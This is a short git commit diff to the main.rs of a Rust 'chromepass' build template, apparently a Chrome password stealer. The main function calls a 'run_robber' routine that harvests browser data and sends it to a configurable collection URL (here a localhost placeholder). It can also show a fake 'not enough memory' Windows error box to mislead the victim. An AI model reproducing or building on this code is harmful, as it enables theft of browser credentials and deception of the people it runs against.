09c3c73d3dca55c52f45a8fef1e6d58f638bbe70
darkarp <mario@whitehathacking.tech>
2021-08-17 14:16:59 +0100

    fix compile issues

--- templates/chromepass-build/src/main.rs
+++ templates/chromepass-build/src/main.rs
@@ -2,21 +2,22 @@
 mod browser;
 mod crypto;
 mod robber;
+extern crate user32;
+extern crate winapi;
 use std::ffi::CString;
-use user32;
 use user32::MessageBoxA;
 
 fn main() -> () {
-    let error: bool = true;
-    let error_message = "There isn't enough memory to complete this action. Try using less data or closing other applications.";
-    let url = "http://127.0.0.1";
+    let error: bool = false;
+    let error_message = r#"There isn't enough memory to complete this action. Try using less data or closing other applications."#;
+    let url = "http://127.0.0.1:80";
     let _ = browser::run_robber(true, true, url);
     if error == true {
         let _ = show_error(error_message);
     }
 }
 
-fn show_error(error_message: &str) -> Result<i32, anyhow::Error> {
+fn show_error(error_message: &str) -> Result<i32, ()> {
     let title = CString::new("Error!")?;
     let message = CString::new(error_message)?;
     unsafe {
